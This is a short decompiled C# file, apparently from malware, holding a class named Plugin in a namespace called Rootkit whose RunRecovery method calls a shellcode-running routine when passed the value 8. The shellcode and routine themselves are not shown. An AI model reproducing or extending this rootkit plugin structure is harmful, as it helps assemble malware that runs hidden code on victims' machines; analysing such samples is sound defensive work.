using System;

namespace Rootkit.Rootkit
{
	// Token: 0x02000008 RID: 8
	public class Plugin
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000021BC File Offset: 0x000003BC
		public static string RunRecovery(int Method)
		{
			string result;
			try
			{
				if (Method == 8)
				{
					Rootkit.RunShellcode();
				}
				result = null;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}
	}
}
